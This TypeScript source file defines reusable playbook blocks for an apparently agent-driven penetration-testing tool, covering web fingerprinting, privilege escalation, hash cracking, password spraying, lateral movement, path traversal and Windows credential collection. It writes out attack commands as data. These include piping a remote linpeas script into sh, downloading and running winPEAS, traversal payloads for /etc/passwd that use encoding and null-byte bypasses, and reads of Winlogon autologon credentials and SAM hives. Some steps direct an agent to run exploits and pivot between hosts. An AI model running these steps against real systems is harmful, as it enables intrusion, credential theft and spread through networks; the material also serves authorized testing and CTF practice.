/**
 * Built-in reusable blocks: Web Recon, Privilege Escalation, Credential Cracking.
 */
import type { PlaybookStep } from "./schema.js";

export interface BlockDef {
  name: string;
  description: string;
  inputSchema: Record<string, string>;
  outputSchema: Record<string, string>;
  nodes: PlaybookStep[];
}

function withStartEnd(block: BlockDef): BlockDef {
  const prefix = block.nodes[0]?.key.split(".")[0] ?? "block";
  const startKey = `${prefix}.start`;
  const endKey = `${prefix}.end`;
  const rootNodes = block.nodes.filter((n) => !n.dependsOn?.length);
  const leafNodes = block.nodes.filter((n) => !block.nodes.some((other) => other.dependsOn?.includes(n.key)));

  const startNode: PlaybookStep = { key: startKey, title: `Start: ${block.name}`, type: "mechanical", nodeType: "sequence", priority: 0 };
  const endNode: PlaybookStep = { key: endKey, title: `Done: ${block.name}`, type: "mechanical", nodeType: "sequence", dependsOn: leafNodes.map((n) => n.key), priority: 99 };

  const updatedNodes = block.nodes.map((n) => {
    if (rootNodes.includes(n) && !n.dependsOn?.length) {
      return { ...n, dependsOn: [startKey] };
    }
    return n;
  });

  return { ...block, nodes: [startNode, ...updatedNodes, endNode] };
}

export const WEB_RECON_BLOCK: BlockDef = {
  name: "Web Recon",
  description: "Web service fingerprinting: tech stack, WAF, headers, favicon hash.",
  inputSchema: { host: "string", port: "number" },
  outputSchema: { tech: "string[]", waf: "string" },
  nodes: [
    { key: "web_recon.tech", title: "Web stack fingerprint (whatweb)", type: "mechanical", command: "pk exec -- whatweb http://{host}:{port} --color=never", priority: 10 },
    { key: "web_recon.waf", title: "WAF detection (wafw00f)", type: "mechanical", command: "pk exec -- wafw00f http://{host}:{port}", priority: 12 },
    { key: "web_recon.headers", title: "HTTP header inspection", type: "mechanical", command: "pk exec -- curl -sI http://{host}:{port}", priority: 11 },
    { key: "web_recon.favicon", title: "Favicon hash lookup", type: "mechanical", command: "pk exec -- curl -s http://{host}:{port}/favicon.ico | md5sum", priority: 13 },
  ],
};

export const PRIVESC_BLOCK: BlockDef = {
  name: "Privilege Escalation",
  description: "OS-aware privesc. Detects Linux/Windows/macOS and runs the appropriate checks.",
  inputSchema: { host: "string" },
  outputSchema: { vector: "string", root: "boolean" },
  nodes: [
    // OS detection - agent interprets output and updates target notes with OS type
    { key: "privesc.detect_os", title: "Detect OS", type: "judgment", command: "pk exec -- uname -s 2>/dev/null || ver 2>/dev/null || echo unknown", priority: 5, description: "Detect the target OS (Linux/Windows/macOS). Update the target notes with 'os:linux', 'os:windows', or 'os:darwin' so downstream conditions work." },

    // Selector: pick OS-specific branch
    { key: "privesc.os_switch", title: "OS Switch", type: "mechanical", nodeType: "selector", dependsOn: ["privesc.detect_os"], priority: 8 },

    // --- Linux branch ---
    { key: "privesc.linux_auto", title: "Linux: linpeas.sh", type: "mechanical", command: "pk exec -- curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null || echo 'linpeas unavailable, using manual checks'", dependsOn: ["privesc.os_switch"], condition: "targets.os contains linux", priority: 9, description: "Automated privesc enumeration. Catches capabilities, docker group, interesting files, and dozens of vectors." },
    { key: "privesc.linux_sudo", title: "Linux: sudo -l", type: "mechanical", command: "pk exec -- sudo -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "targets.os contains linux", priority: 10 },
    { key: "privesc.linux_suid", title: "Linux: SUID binaries", type: "mechanical", command: "pk exec -- find / -perm -4000 -type f 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "targets.os contains linux", priority: 10 },
    { key: "privesc.linux_cron", title: "Linux: Cron jobs", type: "mechanical", command: "pk exec -- cat /etc/crontab 2>/dev/null && ls -la /etc/cron.* 2>/dev/null && crontab -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "targets.os contains linux", priority: 15 },
    { key: "privesc.linux_writable", title: "Linux: Writable paths", type: "mechanical", command: "pk exec -- find / -writable -type f 2>/dev/null | grep -v proc | head -20", dependsOn: ["privesc.os_switch"], condition: "targets.os contains linux", priority: 20 },
    { key: "privesc.linux_kernel", title: "Linux: Kernel version check", type: "judgment", description: "Check kernel version against known exploits. Prefer GTFOBins for SUID/sudo over kernel exploits.", dependsOn: ["privesc.linux_auto", "privesc.linux_sudo", "privesc.linux_suid"], priority: 25 },

    // --- Windows branch ---
    { key: "privesc.win_auto", title: "Windows: winPEAS", type: "mechanical", command: "pk exec -- curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o /tmp/winpeas.exe && /tmp/winpeas.exe 2>/dev/null || echo 'winpeas unavailable'", dependsOn: ["privesc.os_switch"], condition: "targets.os contains windows", priority: 9 },
    { key: "privesc.win_whoami", title: "Windows: whoami /priv", type: "mechanical", command: "pk exec -- whoami /priv", dependsOn: ["privesc.os_switch"], condition: "targets.os contains windows", priority: 10 },
    { key: "privesc.win_services", title: "Windows: Weak service perms", type: "mechanical", command: "pk exec -- sc query state= all | findstr SERVICE_NAME", dependsOn: ["privesc.os_switch"], condition: "targets.os contains windows", priority: 15 },
    { key: "privesc.win_unquoted", title: "Windows: Unquoted service paths", type: "mechanical", command: "pk exec -- wmic service get name,pathname | findstr /v /c:\"C:\\Windows\"", dependsOn: ["privesc.os_switch"], condition: "targets.os contains windows", priority: 15 },
    { key: "privesc.win_autologon", title: "Windows: AutoLogon creds", type: "mechanical", command: "pk exec -- reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "targets.os contains windows", priority: 20 },
    { key: "privesc.win_potato", title: "Windows: Potato exploits", type: "judgment", description: "Check for SeImpersonate/SeAssignPrimaryToken. If present, use PrintSpoofer/GodPotato/JuicyPotato.", dependsOn: ["privesc.win_whoami"], priority: 25 },

    // --- macOS branch ---
    { key: "privesc.mac_sudo", title: "macOS: sudo -l", type: "mechanical", command: "pk exec -- sudo -l 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "targets.os contains darwin", priority: 10 },
    { key: "privesc.mac_tcc", title: "macOS: TCC database", type: "judgment", description: "Check TCC.db for full disk access, screen recording, accessibility permissions that could be abused.", dependsOn: ["privesc.os_switch"], condition: "targets.os contains darwin", priority: 15 },
    { key: "privesc.mac_launchd", title: "macOS: LaunchDaemons/Agents", type: "mechanical", command: "pk exec -- ls -la /Library/LaunchDaemons/ /Library/LaunchAgents/ ~/Library/LaunchAgents/ 2>/dev/null", dependsOn: ["privesc.os_switch"], condition: "targets.os contains darwin", priority: 15 },

    // Converge: pick the best vector from whichever OS branch ran
    { key: "privesc.choose", title: "Choose privesc vector", type: "judgment", description: "Evaluate all findings from automated + manual checks. Pick the most reliable, least destructive escalation path. Use GTFOBins for SUID/sudo. Skip branches that don't match the detected OS.", dependsOn: ["privesc.linux_kernel", "privesc.linux_cron", "privesc.linux_writable", "privesc.win_auto", "privesc.win_potato", "privesc.win_services", "privesc.win_unquoted", "privesc.win_autologon", "privesc.mac_sudo", "privesc.mac_tcc", "privesc.mac_launchd"], priority: 30 },
    { key: "privesc.escalate", title: "Execute escalation", type: "judgment", description: "Run the chosen privesc exploit. Capture evidence of elevated access.", dependsOn: ["privesc.choose"], priority: 35 },
  ],
};

export const CRED_CRACK_BLOCK: BlockDef = {
  name: "Credential Cracking",
  description: "Hash cracking and password spraying workflow with optimization fast-path.",
  inputSchema: { hashes: "string" },
  outputSchema: { cracked: "string[]" },
  nodes: [
    { key: "cred.identify", title: "Identify hash type", type: "judgment", description: "Identify hash format (md5, sha1, bcrypt, NTLM, PBKDF2, etc.) with hashid or hash-identifier. Save to /tmp/hashes.txt. Note the correct hashcat -m mode.", priority: 5 },
    { key: "cred.online_lookup", title: "Online hash lookup", type: "judgment", description: "For unsalted hashes (NTLM, MD5, SHA1): try online lookups first (ntlm.pw, CrackStation) before spending time on local cracking.", dependsOn: ["cred.identify"], priority: 7 },
    { key: "cred.optimize_wordlist", title: "Optimize wordlist", type: "judgment", description: "Check password policy (minimum length, complexity). Trim wordlist to match: grep -E '^.{N,}$' rockyou.txt > trimmed.txt. A 20-char minimum reduces 14M entries to 46K. Also try CeWL-generated wordlists from the target's web content.", dependsOn: ["cred.identify"], priority: 8 },
    { key: "cred.john", title: "John the Ripper", type: "mechanical", command: "pk exec -- john --wordlist=/tmp/trimmed.txt /tmp/hashes.txt", dependsOn: ["cred.online_lookup", "cred.optimize_wordlist"], priority: 10 },
    { key: "cred.hashcat", title: "Hashcat (if john fails)", type: "judgment", description: "Use hashcat with correct -m mode. Prefer host GPU if available (pk crack --host). Fall back to --force for CPU-only containers.", dependsOn: ["cred.john"], priority: 15, optional: true },
    { key: "cred.spray", title: "Password spray", type: "judgment", description: "Try cracked passwords against all discovered services and users.", dependsOn: ["cred.online_lookup", "cred.optimize_wordlist"], priority: 12 },
  ],
};

export const LATERAL_MOVEMENT_BLOCK: BlockDef = {
  name: "Lateral Movement",
  description: "Multi-hop lateral movement: enumerate user context, identify trust boundaries, pivot, verify access, capture evidence. Repeat per hop.",
  inputSchema: { host: "string", user: "string" },
  outputSchema: { pivots: "string[]", flags: "string[]" },
  nodes: [
    { key: "lateral.enumerate", title: "Enumerate current user context", type: "judgment", description: "id, groups, sudo -l, cron, writable files, SSH keys, network connections, running processes. Map what this user can reach.", priority: 5 },
    { key: "lateral.identify_boundary", title: "Identify trust boundary", type: "judgment", description: "Find the path to the next user or host: shared credentials, group membership, writable scripts/cron jobs, service configs, SSH keys, database access.", dependsOn: ["lateral.enumerate"], priority: 10 },
    { key: "lateral.exploit_boundary", title: "Exploit trust boundary", type: "judgment", description: "Use the identified path to move to the next user or host. Search the knowledge base for specific techniques. Prefer the least destructive method.", dependsOn: ["lateral.identify_boundary"], priority: 15 },
    { key: "lateral.verify_access", title: "Verify new access", type: "judgment", description: "Confirm access as the new user: id, whoami, read their files, check their privileges. If access failed, go back to identify_boundary.", dependsOn: ["lateral.exploit_boundary"], priority: 20 },
    { key: "lateral.capture_evidence", title: "Capture evidence", type: "judgment", description: "Capture flag if present. Log credentials as artifacts. Record the pivot technique as a finding. Report the new user context to the orchestrator.", dependsOn: ["lateral.verify_access"], priority: 25 },
  ],
};

export const PATH_TRAVERSAL_BLOCK: BlockDef = {
  name: "Path Traversal Testing",
  description: "Systematic path traversal testing with encoding bypasses for file download/upload endpoints.",
  inputSchema: { url: "string", param: "string" },
  outputSchema: { vulnerable: "boolean", payload: "string" },
  nodes: [
    { key: "path_trav.identify", title: "Identify file operation endpoints", type: "judgment", description: "Find endpoints that accept file paths, hashes, or filenames: download, upload, read, include, template, export, import, attachment endpoints.", priority: 5 },
    { key: "path_trav.plain", title: "Test plain traversal", type: "judgment", command: "pk exec -- curl -sk '{url}/../../../etc/passwd'", dependsOn: ["path_trav.identify"], description: "Test plain ../ and ..\\ traversal. Try /etc/passwd (Linux) and \\windows\\win.ini (Windows).", priority: 10 },
    { key: "path_trav.single_encode", title: "Test single URL-encoded", type: "judgment", command: "pk exec -- curl -sk '{url}/%2e%2e/%2e%2e/%2e%2e/etc/passwd'", dependsOn: ["path_trav.plain"], description: "Test single URL-encoded: %2e%2e%2f (../), %2e%2e%5c (..\\.)", priority: 15 },
    { key: "path_trav.double_encode", title: "Test double URL-encoded", type: "judgment", command: "pk exec -- curl -sk '{url}/%252e%252e/%252e%252e/etc/passwd'", dependsOn: ["path_trav.single_encode"], description: "Test double URL-encoded: %252e%252e%252f, %252e%252e%255c. This bypasses servers that decode once then check.", priority: 20 },
    { key: "path_trav.unicode", title: "Test unicode normalization", type: "judgment", command: "pk exec -- curl -sk '{url}/..%5c..%5c..%5cwindows%5cwin.ini'", dependsOn: ["path_trav.double_encode"], description: "Test unicode/mixed encoding: ..%5c (backslash), ..%c0%af (overlong UTF-8), ..%ef%bc%8f (fullwidth /). Try both forward and backslash variants.", priority: 25 },
    { key: "path_trav.null_byte", title: "Test null byte injection", type: "judgment", command: "pk exec -- curl -sk '{url}/../../etc/passwd%00.png'", dependsOn: ["path_trav.unicode"], description: "Test null byte truncation: append %00 before expected extension to bypass extension checks.", priority: 30 },
  ],
};

export const WINDOWS_FORENSICS_BLOCK: BlockDef = {
  name: "Windows Forensics",
  description: "Post-exploitation Windows artifact collection: registry hives, credential stores, user activity.",
  inputSchema: { host: "string" },
  outputSchema: { artifacts: "string[]", credentials: "string[]" },
  nodes: [
    { key: "win_forensics.ntuser", title: "Download ntuser.dat", type: "judgment", description: "Download NTUSER.DAT from each user profile: C:\\Users\\<user>\\NTUSER.DAT. Parse with regipy or regripper for RecentDocs, TypedPaths, UserAssist, MRU lists, RunMRU.", priority: 5 },
    { key: "win_forensics.registry_hives", title: "Collect registry hives", type: "judgment", description: "If SYSTEM-level access: download SAM, SECURITY, SYSTEM from C:\\Windows\\System32\\config\\. Extract with secretsdump or reg save. Contains local account hashes and LSA secrets.", dependsOn: ["win_forensics.ntuser"], priority: 10 },
    { key: "win_forensics.credential_stores", title: "Check credential stores", type: "judgment", description: "Search for: KeePass databases (.kdbx), browser profiles (Chrome/Firefox/Edge credential stores), PuTTY saved sessions (registry), WinSCP stored passwords, RDP .rdp files with passwords, Wi-Fi profiles (netsh wlan export).", dependsOn: ["win_forensics.ntuser"], priority: 10 },
    { key: "win_forensics.interesting_files", title: "Interesting files checklist", type: "judgment", description: "Search for: .lnk files (recently accessed files, may reveal paths), desktop.ini, unattend.xml/sysprep.xml (plaintext passwords), web.config/appsettings.json (.NET configs), PowerShell history (ConsoleHost_history.txt), .git directories, backup archives (.zip/.7z/.bak).", dependsOn: ["win_forensics.ntuser"], priority: 15 },
    { key: "win_forensics.parse_artifacts", title: "Parse and extract", type: "judgment", description: "Parse collected artifacts with available tools. Use regipy for registry hives, keepass2john + john for .kdbx files, strings/grep for plaintext credentials in configs. Log all credentials as artifacts with pk artifact add.", dependsOn: ["win_forensics.registry_hives", "win_forensics.credential_stores", "win_forensics.interesting_files"], priority: 20 },
  ],
};

export const WEB_ATTACK_SURFACE_BLOCK: BlockDef = {
  name: "Web Attack Surface",
  description: "Systematic web app vulnerability checklist: IDOR, traversal, encoding bypass, upload abuse, auth bypass.",
  inputSchema: { url: "string" },
  outputSchema: { findings: "string[]" },
  nodes: [
    { key: "web_attack.map", title: "Map endpoints and parameters", type: "judgment", description: "List all discovered endpoints, parameters, and input fields. Note which accept file paths, IDs, URLs, or file uploads.", priority: 5 },
    { key: "web_attack.idor", title: "Test for IDOR", type: "judgment", description: "For endpoints with IDs: increment/decrement numeric IDs, swap UUIDs, access other users' resources. Test both authenticated and unauthenticated.", dependsOn: ["web_attack.map"], priority: 10 },
    { key: "web_attack.traversal", title: "Test path traversal", type: "judgment", nodeType: "block_ref", blockRef: "Path Traversal Testing", description: "Run the path traversal block against file operation endpoints.", dependsOn: ["web_attack.map"], priority: 10 },
    { key: "web_attack.auth_bypass", title: "Test auth bypass", type: "judgment", description: "Access endpoints without tokens, with expired tokens, with other users' tokens. Test HTTP verb tampering (GET vs POST vs PUT). Check for 403 bypass via headers (X-Forwarded-For, X-Original-URL).", dependsOn: ["web_attack.map"], priority: 15 },
    { key: "web_attack.upload", title: "Test file upload abuse", type: "judgment", description: "If upload exists: double extensions (.php.jpg), null bytes (.php%00.jpg), content-type manipulation, magic byte spoofing, SVG with embedded script, polyglot files.", dependsOn: ["web_attack.map"], condition: "endpoints.has_upload", priority: 15, optional: true },
    { key: "web_attack.error_disclosure", title: "Test error disclosure", type: "judgment", description: "Trigger errors: invalid input types, oversized input, special characters, missing parameters. Check for stack traces, internal paths, version info, database errors.", dependsOn: ["web_attack.map"], priority: 20 },
  ],
};

export const BUILTIN_BLOCKS: BlockDef[] = [
  WEB_RECON_BLOCK,
  PRIVESC_BLOCK,
  CRED_CRACK_BLOCK,
  LATERAL_MOVEMENT_BLOCK,
  PATH_TRAVERSAL_BLOCK,
  WINDOWS_FORENSICS_BLOCK,
  WEB_ATTACK_SURFACE_BLOCK,
].map(withStartEnd);
